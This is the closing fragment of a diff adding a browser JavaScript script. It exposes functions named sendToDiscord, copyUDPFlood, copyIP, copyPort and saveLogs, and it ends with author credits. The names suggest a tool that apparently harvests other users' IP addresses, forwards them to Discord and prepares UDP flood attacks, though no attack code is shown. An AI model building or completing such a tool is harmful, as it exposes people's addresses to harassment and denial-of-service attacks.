+        if (!isDragging) return;
+
+        isDragging = false;
+        overlay.classList.remove('dragging');
+    });
+
+    window.sendToDiscord = sendToDiscord;
+    window.copyUDPFlood = copyUDPFlood;
+    window.copyIP = copyIP;
+    window.saveLogs = saveLogs;
+    window.copyPort = copyPort;
+    window.copyIPv4Only = copyIPv4Only;
+    window.copyPortOnly = copyPortOnly;
+
+    console.warn("Made by: 95.benedek._ (Koid), have fun using it! ;)");
+    console.warn("Discord: 95.benedek._");
+})();
